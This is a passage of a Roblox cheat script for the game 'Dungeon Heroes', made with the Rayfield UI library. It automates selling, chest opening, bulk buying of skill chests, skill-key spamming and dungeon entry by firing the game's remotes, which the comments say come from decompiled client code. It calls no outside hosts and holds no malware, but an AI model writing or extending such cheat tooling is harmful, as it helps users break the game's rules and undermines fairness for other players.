        Flag = "V4_UseMaxLevelCap",
        Callback = function(Value)
            UseMaxSellLevelCap = Value
        end
    })

    UtilityTab:CreateSlider({
        Name = "Only Sell Gear/Skills At or Below Level",
        Range = {1, 500},
        Increment = 1,
        Suffix = " Lv",
        CurrentValue = 215,
        Flag = "V4_MaxSellLevel",
        Callback = function(Value)
            MaxSellLevel = tonumber(Value) or 215
        end
    })

    UtilityTab:CreateButton({
        Name = "Preview Matching Sell Count (Inv + Bank Scan)",
        Callback = function()
            RunAutoSell(true)
        end
    })

    -- ==========================================
    -- RAYFIELD UI: RARITIES (UNIQUE ID 8 BLOCKED)
    -- ==========================================
    UtilityTab:CreateSection("Sell Rarity Settings (Unique ID 8 Blocked)")

    local Rarities = {
        {Name = "Common (ID 1)", ID = 1},
        {Name = "Uncommon (ID 2)", ID = 2},
        {Name = "Rare (ID 3)", ID = 3},
        {Name = "Epic (ID 4)", ID = 4},
        {Name = "Legendary (ID 5)", ID = 5},
        {Name = "Mythic (ID 6)", ID = 6},
        {Name = "Primordial (ID 7)", ID = 7},
        -- Unique (ID 8) is PERMANENTLY OMITTED and HARD-BLOCKED!
        {Name = "Nightmare (ID 9)", ID = 9},
    }

    for _, Rarity in ipairs(Rarities) do
        UtilityTab:CreateToggle({
            Name = "Sell " .. Rarity.Name,
            CurrentValue = false,
            Flag = "V4_SellRarity_" .. tostring(Rarity.ID),
            Callback = function(Value)
                RarityConfig[Rarity.ID] = Value
            end
        })
    end

    -- ==========================================
    -- BACKGROUND LOOP
    -- ==========================================
    task.spawn(function()
        while true do
            task.wait(ScanDelay)
            if AutoSellEnabled and not IsRunningCycle then
                RunAutoSell(false)
            end
        end
    end)
end


ChestTab:CreateSection("Auto chest open")

do
-- Dungeon Heroes | Universal Parallel Auto Chest Opener (Exact Decompiled Logic)
-- Supports: Pet Chest, Skill Chests, Banana/Event Chests, Basic Chest, Aura Chest, Title Chest, Mega Chest
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Player = Players.LocalPlayer
local Inventory = nil

local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local OpenPetChest = Remotes:WaitForChild("OpenPetChest")
local OpenAuraChest = Remotes:WaitForChild("OpenAuraChest")
local OpenMegaChest = Remotes:WaitForChild("OpenMegaChest")
local OpenChest = Remotes:WaitForChild("OpenChest")

local ChestShop = require(ReplicatedStorage:WaitForChild("Systems"):WaitForChild("ChestShop"))
local ItemList = require(ReplicatedStorage:WaitForChild("WorldModules"):WaitForChild("Items"):WaitForChild("ItemList"))

local BATCH_SIZE = 5
local enabled = false
local session = 0
local Workers = {}
local StackListeners = {}

-- Exact Decompiled Category Detection (Current + Future Chests)
local function GetChestType(item)
	local countObj = item:FindFirstChild("Count")
	if not countObj or not countObj:IsA("ValueBase") then
		return nil
	end

	local uid = item:GetAttribute("ItemUid")
	local data = ItemList[item.Name]

	if type(data) == "table" then
		local cat = data.Category

		if cat == "Pet Chest" then
			return "Pet", uid
		elseif cat == "Chest" then
			-- SkillChest, FrozenSkillChest, GoldenSkillChest, BananaFoodChest & all Event Chests
			return "Standard", uid
		elseif cat == "Basic Chest" or cat == "AuraChest" or cat == "TitleChest" then
			return "Aura", uid
		elseif cat == "MegaChest" then
			return "Mega", uid
		end

		-- Future-proof check: agar future update mein naya chest category aaye jisme loot table ho
		if cat ~= "Armor" and cat ~= "Weapon" and cat ~= "Cosmetic" and cat ~= "Food" and cat ~= "Potion" and cat ~= "Booster" then
			if data.PossibleItems or data.PossibleItemsWithWeights or data.PossibleItemsIsGenerated then
				return "Standard", uid
			end
		end

		return nil
	end

	-- Fallback agar koi naya item ItemList mein na ho
	local lowerName = item.Name:lower()
	if not lowerName:find("chestplate") then
		if lowerName:find("petchest") then
			return "Pet", uid
		elseif lowerName:find("megachest") then
			return "Mega", uid
		elseif lowerName:find("aurachest") or lowerName:find("titlechest") or lowerName:find("basic") then
			return "Aura", uid
		elseif lowerName:find("chest") then
			return "Standard", uid
		end
	end

	return nil
end

-- Start independent worker for each chest stack
local function StartWorker(item, token)
	if Workers[item] == token then
		return
	end

	local chestType, uid = GetChestType(item)
	if not chestType then
		return
	end

	local countObj = item:FindFirstChild("Count")
	if not countObj or not countObj:IsA("ValueBase") or countObj.Value <= 0 then
		return
	end

	Workers[item] = token

	task.spawn(function()
		local failCount = 0

		while enabled and session == token and item.Parent == Inventory and countObj.Parent do
			local before = countObj.Value
			if before <= 0 then
				break
			end

			local amount = math.min(BATCH_SIZE, before)
			local changed = false

			-- Connect before sending request
			local connection = countObj:GetPropertyChangedSignal("Value"):Connect(function()
				if countObj.Value < before then
					changed = true
				end
			end)

			-- Send exact decompiled remote format
			local success, err = pcall(function()
				if chestType == "Pet" then
					OpenPetChest:FireServer(item, amount)
				elseif chestType == "Standard" then
					-- Decompiled format: 3rd argument MUST be a table { uid }
					if uid then
						OpenChest:InvokeServer(item.Name, amount, { uid })
					else
						ChestShop:OpenChest(Player, item.Name, amount, { item })
					end
				elseif chestType == "Mega" then
					OpenMegaChest:FireServer(uid or item, amount)
				elseif chestType == "Aura" then
					OpenAuraChest:FireServer(uid or item, amount)
				end
			end)

			if not success then
				connection:Disconnect()
				warn("Chest error:", item.Name, err)
				break
			end

			-- Wait for inventory count update
			local startTime = os.clock()
			while enabled and session == token and not changed and (os.clock() - startTime) < 3 do
				if countObj.Value < before or not item.Parent then
					changed = true
					break
				end
				task.wait()
			end

			connection:Disconnect()

			if not changed then
				failCount += 1
				if failCount >= 2 then
					warn("No inventory update (Level locked or unsupported):", item.Name)
					break
				end
				task.wait(0.2)
			else
				failCount = 0
			end
		end

		if Workers[item] == token then
			Workers[item] = nil
		end
	end)
end

-- Watch existing stack if more chests get added to the same stack later
local function WatchStack(item)
	if StackListeners[item] then
		return
	end

	task.spawn(function()
		local countObj = item:FindFirstChild("Count") or item:WaitForChild("Count", 2)
		if not countObj or not countObj:IsA("ValueBase") then
			return
		end

		if not GetChestType(item) then
			return
		end

		StackListeners[item] = countObj:GetPropertyChangedSignal("Value"):Connect(function()
			if enabled and countObj.Value > 0 and Workers[item] ~= session then
				StartWorker(item, session)
			end
		end)

		item.AncestryChanged:Connect(function(_, parent)
			if not parent and StackListeners[item] then
				StackListeners[item]:Disconnect()
				StackListeners[item] = nil
			end
		end)
	end)
end

-- Scan every chest stack in Inventory
local function ScanInventory(token)
	if not Inventory then
		return
	end

	for _, item in ipairs(Inventory:GetChildren()) do
		if not enabled or session ~= token then
			break
		end
		WatchStack(item)
		StartWorker(item, token)
	end
end

-- Detect Inventory & newly added chests in background
task.spawn(function()
	local PlayerGui = Player:WaitForChild("PlayerGui")
	local Profile = PlayerGui:WaitForChild("Profile")
	Inventory = Profile:WaitForChild("Inventory")

	Inventory.ChildAdded:Connect(function(item)
		WatchStack(item)
		if enabled then
			local token = session
			task.defer(function()
				if not item:FindFirstChild("Count") then
					item:WaitForChild("Count", 2)
				end
				if enabled and session == token then
					StartWorker(item, token)
				end
			end)
		end
	end)

	for _, item in ipairs(Inventory:GetChildren()) do
		WatchStack(item)
	end

	if enabled then
		ScanInventory(session)
	end
end)

-- Main toggle
ChestTab:CreateToggle({
	Name = "Auto Open All Chests",
	CurrentValue = false,
    Flag = "AutoOpenAllChests",
	Callback = function(value)
		enabled = value
		session += 1

		if enabled then
			local token = session
			ScanInventory(token)
		end
	end
})
end

ChestTab:CreateSection("Auto Buy Skill Chest")

do

-- ============================================================================
-- DUNGEON HEROES | SMART REMOTE SKILL CHEST BUYER (15 DUNGEONS + ELITE CHESTS)
-- ============================================================================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local Systems = ReplicatedStorage:WaitForChild("Systems")
local ChestShop = require(Systems:WaitForChild("ChestShop"))
local DungeonsSys = require(Systems:WaitForChild("Dungeons"))
local ItemList = require(ReplicatedStorage:WaitForChild("WorldModules"):WaitForChild("Items"):WaitForChild("ItemList"))
local OpenChestRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("OpenChest")

-- ============================================================================
-- 1. CUSTOM 3-SECOND TOP UI NOTIFICATION SYSTEM (NON-RAYFIELD)
-- ============================================================================
local ActiveNotifGui = nil
local ActiveNotifToken = 0

local function ShowTopNotification(titleText, bodyText, isError)
	ActiveNotifToken += 1
	local currentToken = ActiveNotifToken

	if ActiveNotifGui and ActiveNotifGui.Parent then
		ActiveNotifGui:Destroy()
	end

	local parentGui = (gethui and gethui()) or LocalPlayer:FindFirstChildOfClass("PlayerGui") or CoreGui
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "DH_SkillShopNotifier"
	screenGui.ResetOnSpawn = false
	screenGui.DisplayOrder = 999999
	screenGui.IgnoreGuiInset = true
	pcall(function()
		screenGui.Parent = CoreGui
	end)
	if not screenGui.Parent then
		screenGui.Parent = parentGui
	end
	ActiveNotifGui = screenGui

	local mainFrame = Instance.new("Frame")
	mainFrame.Name = "Banner"
	mainFrame.AnchorPoint = Vector2.new(0.5, 0)
	mainFrame.Position = UDim2.new(0.5, 0, 0, -90)
	mainFrame.Size = UDim2.new(0, 440, 0, 68)
	mainFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 28)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = screenGui

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = mainFrame

	local stroke = Instance.new("UIStroke")
	stroke.Thickness = 2
	stroke.Color = isError and Color3.fromRGB(255, 75, 75) or Color3.fromRGB(60, 220, 130)
	stroke.Parent = mainFrame

	local titleLabel = Instance.new("TextLabel")
	titleLabel.BackgroundTransparency = 1
	titleLabel.Position = UDim2.new(0, 14, 0, 8)
	titleLabel.Size = UDim2.new(1, -28, 0, 22)
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextSize = 15
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.TextColor3 = isError and Color3.fromRGB(255, 95, 95) or Color3.fromRGB(80, 240, 150)
	titleLabel.Text = titleText
	titleLabel.Parent = mainFrame

	local bodyLabel = Instance.new("TextLabel")
	bodyLabel.BackgroundTransparency = 1
	bodyLabel.Position = UDim2.new(0, 14, 0, 30)
	bodyLabel.Size = UDim2.new(1, -28, 0, 32)
	bodyLabel.Font = Enum.Font.GothamMedium
	bodyLabel.TextSize = 13
	bodyLabel.TextWrapped = true
	bodyLabel.TextXAlignment = Enum.TextXAlignment.Left
	bodyLabel.TextYAlignment = Enum.TextYAlignment.Top
	bodyLabel.TextColor3 = Color3.fromRGB(235, 235, 240)
	bodyLabel.Text = bodyText
	bodyLabel.Parent = mainFrame

	-- Slide Down Animation
	TweenService:Create(
		mainFrame,
		TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
		{ Position = UDim2.new(0.5, 0, 0, 18) }
	):Play()

	-- Auto Disappear in 3 Seconds
	task.delay(3, function()
		if ActiveNotifToken ~= currentToken or not screenGui.Parent then
			return
		end
		local outTween = TweenService:Create(
			mainFrame,
			TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
			{ Position = UDim2.new(0.5, 0, 0, -90) }
		)
		outTween:Play()
		outTween.Completed:Wait()
		if screenGui.Parent then
			screenGui:Destroy()
		end
	end)
end

local function FormatNumber(n)
	local formatted = tostring(math.floor(tonumber(n) or 0))
	while true do
		local k
		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", "%1,%2")
		if k == 0 then break end
	end
	return formatted
end

-- ============================================================================
-- 2. HELPER FUNCTIONS FOR CURRENCIES, INVENTORY & CHEST PRICES
-- ============================================================================
local function GetProfile()
	local pGui = LocalPlayer:FindFirstChild("PlayerGui")
	return pGui and pGui:FindFirstChild("Profile")
end

local function GetPlayerLevel()
	local profile = GetProfile()
	local lvlObj = profile and profile:FindFirstChild("Level")
	return (lvlObj and tonumber(lvlObj.Value)) or 1
end

local function GetPlayerKeys()
	local profile = GetProfile()
	local currencies = profile and profile:FindFirstChild("Currencies")
	local keysObj = currencies and currencies:FindFirstChild("Keys")
	return (keysObj and tonumber(keysObj.Value)) or 0
end

local function GetInventoryItemCount(itemName)
	if not itemName then return 0 end
	local profile = GetProfile()
	local inv = profile and profile:FindFirstChild("Inventory")
	if not inv then return 0 end

	local total = 0
	for _, item in ipairs(inv:GetChildren()) do
		if item.Name == itemName then
			local countObj = item:FindFirstChild("Count")
			total += (countObj and tonumber(countObj.Value)) or 1
		end
	end
	return total
end

local function GetDynamicChestCosts(chestId, rawData)
	local playerLvl = GetPlayerLevel()
	local resolvedData = rawData

	-- Check level-scaled chest data from ChestShop
	if type(ChestShop.GetChestDataForLevel) == "function" then
		local ok, res = pcall(function()
			return ChestShop:GetChestDataForLevel(chestId, playerLvl)
		end)
		if (not ok or type(res) ~= "table") then
			ok, res = pcall(function()
				return ChestShop:GetChestDataForLevel(rawData, playerLvl)
			end)
		end
		if ok and type(res) == "table" then
			resolvedData = res
		end
	end

	local keyPrice = tonumber(resolvedData.Price) or tonumber(rawData.Price)

	if not keyPrice and type(ChestShop.GetChestPriceForLevel) == "function" then
		local ok, p = pcall(function()
			return ChestShop:GetChestPriceForLevel(chestId, playerLvl)
		end)
		if ok and type(p) == "number" then
			keyPrice = p
		end
	end

	local eliteKeyItem = resolvedData.EliteKeyItem or rawData.EliteKeyItem
	local eliteKeyPrice = tonumber(resolvedData.EliteKeyPrice) or tonumber(rawData.EliteKeyPrice) or (eliteKeyItem and 1 or 0)

	if eliteKeyItem and not keyPrice then
		if type(ChestShop.GetEliteChestKeysPrice) == "function" then
			local ok, ep = pcall(function()
				return ChestShop:GetEliteChestKeysPrice(resolvedData)
			end)
			if ok and type(ep) == "number" then
				keyPrice = ep
			end
		end
		keyPrice = keyPrice or 20000 -- Default Elite Skill Chest Key cost
	end

	return keyPrice or 0, eliteKeyItem, eliteKeyPrice
end

-- ============================================================================
-- 3. SCAN & SORT ALL 15 DUNGEON SKILL CHESTS (1ST TO 15TH LINE-WISE)
-- ============================================================================
local DUNGEON_PROGRESSION = {
	["ForestDungeon"]          = { Order = 1,  Name = "Forest Dungeon" },
	["MountainDungeon"]        = { Order = 2,  Name = "Mountain Dungeon" },
	["CoveDungeon"]            = { Order = 3,  Name = "Deadman's Cove" },
	["PirateDungeon"]          = { Order = 3,  Name = "Deadman's Cove" },
	["CastleDungeon"]          = { Order = 4,  Name = "Castle Dungeon" },
	["JungleDungeon"]          = { Order = 5,  Name = "Jungle Dungeon" },
	["AstralDungeon"]          = { Order = 6,  Name = "Astral Abyss" },
	["DesertDungeon"]          = { Order = 7,  Name = "Desert Dungeon" },
	["CaveDungeon"]            = { Order = 8,  Name = "Cave Dungeon" },
	["MushroomDungeon"]        = { Order = 9,  Name = "Mushroom Forest" },
	["GoldDungeon"]            = { Order = 10, Name = "Golden Realm" },
	["TwilightForestDungeon"]  = { Order = 11, Name = "Twilight Grove" },
	["CathedralDungeon"]       = { Order = 12, Name = "Cathedral Dungeon" },
	["OceanDungeon"]           = { Order = 13, Name = "Sunken (Ocean)" },
	["EnchantedForestDungeon"] = { Order = 14, Name = "Sylvan Glade" },
	["FrostDungeon"]           = { Order = 15, Name = "Frostheim Reach" }
}

local SkillChestList = {}
local DropdownOptionToChest = {}
local DropdownOptions = {}

local function BuildOrderedSkillChestList()
	table.clear(SkillChestList)
	table.clear(DropdownOptionToChest)
	table.clear(DropdownOptions)

	for itemId, data in pairs(ItemList) do
		if type(data) == "table"
			and data.Category == "Chest"
			and data.Type == "Skills"
			and not data.Disabled
			and not data.InDevelopment
			and not data.HideFromChestShop
			and not string.find(string.lower(itemId), "gauntlet")
		then
			local dungeonId = data.Dungeon
			local dInfo = dungeonId and DUNGEON_PROGRESSION[dungeonId]

			local dData = nil
			if dungeonId and type(DungeonsSys.GetDungeonData) == "function" then
				local ok, res = pcall(function()
					return DungeonsSys:GetDungeonData(dungeonId)
				end)
				if ok and type(res) == "table" then
					dData = res
				end
			end

			local reqLevel = (dData and tonumber(dData.RequiredLevel))
				or (data.LevelRange and tonumber(data.LevelRange.Min))
				or 1

			local minRange = (data.LevelRange and tonumber(data.LevelRange.Min)) or reqLevel
			local isElite = (data.EliteKeyItem ~= nil)

			-- Exact progression priority (1 to 15)
			local sortOrder = dInfo and dInfo.Order or nil
			if not sortOrder then
				if isElite then
					local lowerName = string.lower(itemId .. " " .. tostring(data.DisplayName or "") .. " " .. tostring(dungeonId or ""))
					if string.find(lowerName, "sunken") or string.find(lowerName, "ocean") or string.find(lowerName, "abyss") then
						sortOrder = 13
					elseif string.find(lowerName, "elderwood") or string.find(lowerName, "sylvan") or string.find(lowerName, "forest") then
						sortOrder = 14
					elseif string.find(lowerName, "frost") or string.find(lowerName, "rime") or string.find(lowerName, "frozen") then
						sortOrder = 15
					else
						sortOrder = 16
					end
				else
					sortOrder = 0 -- Sorted by minRange / Price below
				end
			end

			local dungeonDisplayName = (dInfo and dInfo.Name)
				or (dData and (dData.DisplayName or dData.Name))
				or (dungeonId and string.gsub(dungeonId, "Dungeon", ""))
				or ("Lvl " .. tostring(minRange) .. "+")

			local chestDisplayName = data.DisplayName or itemId
			local basePrice = tonumber(data.Price) or 0

			table.insert(SkillChestList, {
				Id = itemId,
				Data = data,
				ChestName = chestDisplayName,
				DungeonName = dungeonDisplayName,
				IsElite = isElite,
				EliteKeyItem = data.EliteKeyItem,
				ReqLevel = reqLevel,
				MinRange = minRange,
				BasePrice = basePrice,
				SortOrder = sortOrder
			})
		end
	end

	-- Sort strictly from 1st Dungeon to 15th Dungeon
	table.sort(SkillChestList, function(a, b)
		if a.IsElite ~= b.IsElite then
			return not a.IsElite -- Normal Dungeons (1-12) first, Elite Dungeons (13-15) last
		end
		if a.SortOrder ~= b.SortOrder and a.SortOrder > 0 and b.SortOrder > 0 then
			return a.SortOrder < b.SortOrder
		end
		if a.MinRange ~= b.MinRange then
			return a.MinRange < b.MinRange
		end
		if a.ReqLevel ~= b.ReqLevel then
			return a.ReqLevel < b.ReqLevel
		end
		if a.BasePrice ~= b.BasePrice then
			return a.BasePrice < b.BasePrice
		end
		return a.Id < b.Id
	end)

	for idx, entry in ipairs(SkillChestList) do
		local label
		if entry.IsElite then
			local eliteKeyData = ItemList[entry.EliteKeyItem]
			local eliteKeyName = (eliteKeyData and eliteKeyData.DisplayName) or entry.EliteKeyItem
			label = string.format("#%d | %s - %s [ELITE: %s]", idx, entry.DungeonName, entry.ChestName, eliteKeyName)
		else
			label = string.format("#%d | %s (Lvl %d+) - %s", idx, entry.DungeonName, entry.MinRange, entry.ChestName)
		end

		entry.Label = label
		DropdownOptionToChest[label] = entry
		table.insert(DropdownOptions, label)
	end
end

BuildOrderedSkillChestList()

-- ============================================================================
-- 4. BUY & OPEN EXECUTION ENGINE (BATCH SIZE x REPEAT COUNT)
-- ============================================================================
local SelectedChestEntry = SkillChestList[1]
local BatchSize = 5       -- 1 baari mein kitne kholne hain (1 to 5)
local RepeatTimes = 1     -- Kitni baar wo batch kholna hai
local IsBuying = false
local BuySession = 0

local function VerifyCanBuyBatch(entry, amountToOpen)
	if not entry then
		ShowTopNotification("Skill Chest Error", "Pehle Dropdown se koi Dungeon Skill Chest select karo!", true)
		return false
	end

	-- 1. Check Dungeon Level Requirement if applicable
	local playerLvl = GetPlayerLevel()
	if entry.Data.Dungeon then
		local ok, dData = pcall(function()
			return DungeonsSys:GetDungeonData(entry.Data.Dungeon)
		end)
		local reqLvl = (ok and dData and tonumber(dData.RequiredLevel)) or 0
		if reqLvl > 0 and playerLvl < reqLvl then
			ShowTopNotification(
				"Level Locked: " .. entry.ChestName,
				string.format("Tumhara Level %d hai, is chest ke liye Level %d chahiye!", playerLvl, reqLvl),
				true
			)
			return false
		end
	end

	-- 2. Check Normal Keys & Elite Key
	local keyPricePerChest, eliteKeyItem, eliteKeyPerChest = GetDynamicChestCosts(entry.Id, entry.Data)
	local neededKeys = keyPricePerChest * amountToOpen
	local currentKeys = GetPlayerKeys()

	local missingParts = {}

	if neededKeys > 0 and currentKeys < neededKeys then
		local shortKeys = neededKeys - currentKeys
		table.insert(missingParts, string.format(
			"%s Keys kam hain (Need: %s | Have: %s)",
			FormatNumber(shortKeys), FormatNumber(neededKeys), FormatNumber(currentKeys)
		))
	end

	if eliteKeyItem and eliteKeyPerChest > 0 then
		local neededElite = eliteKeyPerChest * amountToOpen
		local currentElite = GetInventoryItemCount(eliteKeyItem)
		if currentElite < neededElite then
			local shortElite = neededElite - currentElite
			local eliteData = ItemList[eliteKeyItem]
			local eliteDisplayName = (eliteData and eliteData.DisplayName) or eliteKeyItem
			table.insert(missingParts, string.format(
				"%dx %s kam hai (Need: %d | Have: %d)",
				shortElite, eliteDisplayName, neededElite, currentElite
			))
		end
	end

	if #missingParts > 0 then
		ShowTopNotification(
			"Missing Items for " .. entry.ChestName,
			table.concat(missingParts, "  |  "),
			true
		)
		return false
	end

	return true
end

local function RunSkillChestBuyer(token)
	local entry = SelectedChestEntry
	if not entry then
		IsBuying = false
		ShowTopNotification("Skill Chest Error", "Koi Dungeon Skill Chest select nahi hai!", true)
		return
	end

	local totalBatches = math.max(1, math.floor(RepeatTimes))
	local perBatch = math.clamp(math.floor(BatchSize), 1, 5)
	local totalOpened = 0

	for batchIndex = 1, totalBatches do
		if not IsBuying or BuySession ~= token then
			break
		end

		-- Pre-check currencies & keys before every batch
		if not VerifyCanBuyBatch(entry, perBatch) then
			IsBuying = false
			break
		end

		local keysBefore = GetPlayerKeys()
		local eliteBefore = entry.EliteKeyItem and GetInventoryItemCount(entry.EliteKeyItem) or 0

		local ok, result = pcall(function()
			-- ChestShop:OpenChest with 4th arg nil buys directly from shop & materializes skills
			if type(ChestShop.OpenChest) == "function" then
				return ChestShop:OpenChest(LocalPlayer, entry.Id, perBatch)
			else
				return OpenChestRemote:InvokeServer(entry.Id, perBatch)
			end
		end)

		local keysAfter = GetPlayerKeys()
		local eliteAfter = entry.EliteKeyItem and GetInventoryItemCount(entry.EliteKeyItem) or 0
		local currencySpent = (keysAfter < keysBefore) or (eliteAfter < eliteBefore)
		local gotItems = (type(result) == "table" and #result > 0)

		if not ok or (not gotItems and not currencySpent) then
			-- Re-verify if currency ran out or server rejected
			if VerifyCanBuyBatch(entry, perBatch) then
				ShowTopNotification(
					"Purchase Blocked: " .. entry.ChestName,
					"Server ne chest open nahi ki (Level requirement ya Inventory full check karo).",
					true
				)
			end
			IsBuying = false
			break
		end

		totalOpened += perBatch

		if batchIndex < totalBatches then
			task.wait(0.15)
		end
	end

	if totalOpened > 0 and BuySession == token then
		ShowTopNotification(
			"Skill Chests Opened!",
			string.format("Successfully opened %dx %s (%s)!", totalOpened, entry.ChestName, entry.DungeonName),
			false
		)
	end

	if BuySession == token then
		IsBuying = false
	end
end

-- ============================================================================
-- 5. RAYFIELD UI CONTROLS (DROPDOWN, SLIDERS, BUTTON / TOGGLE)
-- ============================================================================
ChestTab:CreateSection("Dungeon Skill Shop (Remote Buyer)")

	ChestTab:CreateDropdown({
		Name = "Select Dungeon Skill Chest (1 to 15)",
		Options = DropdownOptions,
		CurrentOption = DropdownOptions[1] and { DropdownOptions[1] } or {},
		MultipleOptions = false,
		Flag = "DungeonSkillChestDropdown",
		Callback = function(Option)
			local chosen = type(Option) == "table" and Option[1] or Option
			if chosen and DropdownOptionToChest[chosen] then
				SelectedChestEntry = DropdownOptionToChest[chosen]
			end
		end
	})

	ChestTab:CreateSlider({
		Name = "Chests Per Batch (1 Baari Me Kitna Kholna Hai)",
		Range = {1, 5},
		Increment = 1,
		Suffix = "Chests",
		CurrentValue = 5,
		Flag = "SkillChestBatchSize",
		Callback = function(Value)
			BatchSize = Value
		end
	})

	ChestTab:CreateSlider({
		Name = "Repeat Times (Kitni Baar Kholna Hai)",
		Range = {1, 100},
		Increment = 1,
		Suffix = "Times",
		CurrentValue = 1,
		Flag = "SkillChestRepeatTimes",
		Callback = function(Value)
			RepeatTimes = Value
		end
	})

	ChestTab:CreateButton({
		Name = "Buy & Open Selected Skill Chest",
		Callback = function()
			if IsBuying then
				-- Agar pehle se chal raha hai toh dobara click karne pe stop kar dega
				IsBuying = false
				BuySession += 1
				ShowTopNotification("Stopped", "Skill Chest opening रोक di gayi hai.", true)
				return
			end

			IsBuying = true
			BuySession += 1
			local token = BuySession
			task.spawn(function()
				RunSkillChestBuyer(token)
			end)
		end
	})
end

UtilityTab:CreateSection("Auto Skill Cast")

local VirtualInputManager =
game:GetService("VirtualInputManager")

local AutoSkillEnabled = false
local SkillRunId = 0

-- Configuration
local KEYS = {
Enum.KeyCode.E,
Enum.KeyCode.R,
Enum.KeyCode.F,
Enum.KeyCode.X,
Enum.KeyCode.C
}

local HoldTime = 0.05
local Delay = 0.1

-- Auto Skill Function
local function StartSkillSpam()
SkillRunId += 1
local CurrentRun = SkillRunId

AutoSkillEnabled = true  

task.spawn(function()  
    while AutoSkillEnabled and SkillRunId == CurrentRun do  

        for _, Key in ipairs(KEYS) do  

            if not AutoSkillEnabled  
            or SkillRunId ~= CurrentRun then  
                break  
            end  

            -- Key Press  
            pcall(function()  
                VirtualInputManager:SendKeyEvent(  
                    true,  
                    Key,  
                    false,  
                    game  
                )  
            end)  

            task.wait(HoldTime)  

            -- Key Release  
            pcall(function()  
                VirtualInputManager:SendKeyEvent(  
                    false,  
                    Key,  
                    false,  
                    game  
                )  
            end)  

            task.wait(Delay)  
        end  
    end  
end)

end

-- Toggle
UtilityTab:CreateToggle({
Name = "Auto Skill Spam",
CurrentValue = false,
Flag = "AutoSkillSpam",

Callback = function(Value)  

    if Value then  
        StartSkillSpam()  
        print("Auto Skills: ON")  
    else  
        AutoSkillEnabled = false  
        SkillRunId += 1  

        -- Release all keys when disabled  
        for _, Key in ipairs(KEYS) do  
            pcall(function()  
                VirtualInputManager:SendKeyEvent(  
                    false,  
                    Key,  
                    false,  
                    game  
                )  
            end)  
        end  

        print("Auto Skills: OFF")  
    end  
end

})


-- ================ Auto Dungeon Start ========================
-- ================ Auto Dungeon Start ========================
-- ================ Auto Dungeon Start ========================
-- ================ Auto Dungeon Start ========================

do
    --====================================================
    -- DUNGEON HEROES | AUTO ENTRY V7 (ULTIMATE EDITION)
    -- 1. Preserves In-Game Saved Modifiers (Profile.DungeonModifierConfigs)
    -- 2. Player Limit Slider (1 to 8 Players, Default = 1)
    -- 3. Filters Out Expired Events (Shows Only Currently Active Events)
    -- 4. Smart Auto-Start (Verifies workspace DungeonStarted attribute)
    -- 5. Pro Top UI Notifications (No Rayfield:Notify)
    --====================================================

    local RS = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")
    local CoreGui = game:GetService("CoreGui")

    local Player = Players.LocalPlayer
    local Remotes = RS:WaitForChild("Remotes")

    local SetSettings = Remotes:WaitForChild("Parties/SetSettings")
    local SaveModifiers = Remotes:WaitForChild("SaveDungeonModifierConfig")
    local TriggerStartDungeon = Remotes:WaitForChild("TriggerStartDungeon")

    local Dungeons = require(RS.Systems.Dungeons)
    local Locations = require(RS.Systems.Locations)
    local ProfileSystem = require(RS.Systems.Profile)

    local EventsSystem = nil
    pcall(function()
        if RS.Systems:FindFirstChild("Events") then
            EventsSystem = require(RS.Systems.Events)
        end
    end)

    local Floors = Locations:GetFloorData()
    local Difficulties = Dungeons:GetAllDifficulties()

    -- ==========================================
    -- PRO TOP UI NOTIFICATION (NO RAYFIELD NOTIFY)
    -- ==========================================
    local function ShowTopNotification(TitleText, SubText, AccentColor, Duration)
        task.spawn(function()
            pcall(function()
                local ShowTime = Duration or 3.2
                local ThemeColor = AccentColor or Color3.fromRGB(0, 225, 140)

                local ParentGui = (gethui and gethui())
                    or CoreGui
                    or Player:WaitForChild("PlayerGui")

                local OldGui = ParentGui:FindFirstChild("DH_AutoEntryTopNotify")
                if OldGui then OldGui:Destroy() end

                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Name = "DH_AutoEntryTopNotify"
                ScreenGui.IgnoreGuiInset = true
                ScreenGui.DisplayOrder = 999999
                ScreenGui.Parent = ParentGui

                local MainFrame = Instance.new("Frame")
                MainFrame.Size = UDim2.new(0, 400, 0, 66)
                MainFrame.Position = UDim2.new(0.5, -200, 0, -85)
                MainFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 24)
                MainFrame.BorderSizePixel = 0
                MainFrame.ClipsDescendants = true
                MainFrame.Parent = ScreenGui

                local MainCorner = Instance.new("UICorner")
                MainCorner.CornerRadius = UDim.new(0, 12)
                MainCorner.Parent = MainFrame

                local MainStroke = Instance.new("UIStroke")
                MainStroke.Color = ThemeColor
                MainStroke.Thickness = 1.6
                MainStroke.Transparency = 0.15
                MainStroke.Parent = MainFrame

                local SideBar = Instance.new("Frame")
                SideBar.Size = UDim2.new(0, 5, 1, -16)
                SideBar.Position = UDim2.new(0, 8, 0, 8)
                SideBar.BackgroundColor3 = ThemeColor
                SideBar.BorderSizePixel = 0
                SideBar.Parent = MainFrame

                local SideCorner = Instance.new("UICorner")
                SideCorner.CornerRadius = UDim.new(1, 0)
                SideCorner.Parent = SideBar

                local Title = Instance.new("TextLabel")
                Title.Size = UDim2.new(1, -34, 0, 22)
                Title.Position = UDim2.new(0, 22, 0, 8)
                Title.BackgroundTransparency = 1
                Title.Font = Enum.Font.GothamBold
                Title.TextSize = 14
                Title.TextColor3 = ThemeColor
                Title.TextXAlignment = Enum.TextXAlignment.Left
                Title.TextTruncate = Enum.TextTruncate.AtEnd
                Title.Text = tostring(TitleText)
                Title.Parent = MainFrame

                local Sub = Instance.new("TextLabel")
